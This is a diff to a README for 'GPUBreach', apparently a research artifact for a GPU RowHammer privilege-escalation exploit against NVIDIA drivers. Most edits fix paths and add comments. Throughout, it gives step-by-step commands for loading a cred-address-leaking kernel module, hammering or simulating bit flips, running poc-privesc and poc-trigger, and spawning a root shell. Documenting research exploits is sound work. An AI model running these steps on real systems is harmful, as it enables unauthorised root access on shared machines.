@@ -84,7 +84,7 @@ sudo ./nvidia-installer
 Afterward, run these to make the relevant dumpers.
 
 ```bash
-cd ../ # gpubreach
+cd ../ # goes back to gpubreach
 bash run_make_dumpers.sh
 ```
 
@@ -208,7 +208,7 @@ NUMA:
 This step provides the service of getting the address of the `cred` structure, derived from the assumption that a process's `cred` data structure can be leaked via other side-channels.
 
 ```bash
-$ cd open-gpu-kernel-modules/cred_mod/
+$ cd cred_mod/
 $ make
 $ sudo insmod get_cred_addr.ko
 ```
@@ -220,7 +220,7 @@ $ sudo insmod get_cred_addr.ko
 Create a 1GB pattern file that will be used to fill GPU memory:
 
 ```bash
-$ cd d2h-tools/
+$ cd d2h-tools/ # at gpubreach/
 $ ./create_d_pattern.py --size 1GB --output d_pattern.bin
 ```
 
@@ -231,7 +231,7 @@ $ ./create_d_pattern.py --size 1GB --output d_pattern.bin
 Build the memory operator and load the pattern:
 
 ```bash
-$ cd d2h-tools/mem-operator/
+$ cd d2h-tools/mem-operator/ # at gpubreach/
 $ make -j
 $ cd ..
 $ ./mem-operator/mem-operator ./d_pattern.bin  # Run this command as-is as a regular user with GPU access (non-root). The exploit will later escalate privileges to root.
@@ -242,7 +242,13 @@ This `mem-operator` will:
 - Fill it with the pattern from Step 1
 - Open an interactive command prompt for later steps
 
-**Wait until a '>' appears, indicating that the prompt is ready, and keep this terminal open** - you will need it in the step of executing privilege escalation.
+<!-- **Wait until a '>' appears, indicating that the prompt is ready, and keep this terminal open** - you will need it in the step of executing privilege escalation. -->
+
+**Wait until a '>' appears, indicating that the prompt is ready.**
+
+**Important!!!** If you are trying Step 3 **Case 1**, keep this terminal __open__. you will need it in the step of executing privilege escalation.
+
+**Important!!!** If you are trying Step 3 **Case 2**, close it for now.
 
 ---
 
@@ -256,7 +262,7 @@ If you just want to verify the exploit without running the GPU RowHammer part (C
 - Check dmesg for the IOVA values.
 
 ```bash
-$ sudo dmesg | grep “IOVA (GPU view)”  # for GPU’s IOVA
+$ sudo dmesg | grep "IOVA (GPU view)"  # for GPU’s IOVA
 ```
 
 Note that this value is stable across runnings and machines, always 0xffe41000 or 0xfff41000.
@@ -268,8 +274,8 @@ e.g.  `IOVA_BASE="0xfff00000"` or `IOVA_BASE="0xffe00000"`.
 Then run the script to simulate rowhammer behaviour using sudo. 
 
 ```bash
-cd d2h-tools/scripts/
-sudo ./simulate_rowhammer.sh
+cd d2h-tools/gpu_mem_dumper/scripts/
+sudo bash ./simulate_rowhammer.sh
 ``` 
 
 ---
@@ -297,7 +303,10 @@ As instructed, on another terminal, you will execute:
 Once the terminal appears, it means the data has been loaded. Now go back to GPUBreach’s terminal and **Press Enter Key**. On success, GPUBreach will print the text below and exit:
 ```text
 Found its PTE, modified your pointer's PTE to point to: 0x060000000fff0005
+Press Enter Key if you want to write 0x060000000ffe0005 instead after looking at dmesg.
 ```
+
+> If you open `sudo dmesg -w`, you can see a after `poc-init`, there are red text that is either `0xfff` or `0xffe`. Click enter if you see `0xffe`.
 
 Now you are ready to move on to Step 4.
 
@@ -308,7 +317,7 @@ Now you are ready to move on to Step 4.
 In the command prompt that opened in Step 2, run the following application commands step by step. Note that `>` means that these commands are run in the GPU memory operator's command prompt, not the regular shell.
 
 ```bash
-> poc-init
+> poc-init # If case 2, check dmesg to see if base is `0xfff` or `0xffe`
 > poc-cw-entry0-checksum
 > poc-privesc
 > poc-trigger 5
@@ -331,7 +340,7 @@ User identity check:
 
 The effective UID of 0 indicates successful privilege escalation to root.
 
-If the Effective UID is not 0, the exploit has failed. You can try to execute `poc-trigger 5` again. If still unsuccessful, you may need to reboot the machine using out-of-band methods and restart the exploit.
+If the Effective UID is not 0, the exploit has failed. You can try to execute `poc-trigger 5` again. **If still unsuccessful, you may need to reboot the machine using out-of-band methods and restart the exploit.**
 
 ### 6.5 Spawn root shell
 
@@ -365,4 +374,4 @@ You now have a root shell while starting as a regular user.
    bash run_regenerate_a1.sh
    ```
 
-   It will iteratively hammer and check whether bit-flip re-appeared. Unfortunately, when exactly it will re-appear is not known. You may choose to wait a few hours or a day before restarting the process.
+   It will iteratively hammer and check whether bit-flip re-appeared. Unfortunately, when exactly it will re-appear is not know (may be a few minutes or hours). You may choose to wait a few hours or a day before restarting the process. For the CPU-GPU exploit, you may also go for case 1 instead of case 2, given we already demonstrated arbitrary RW.
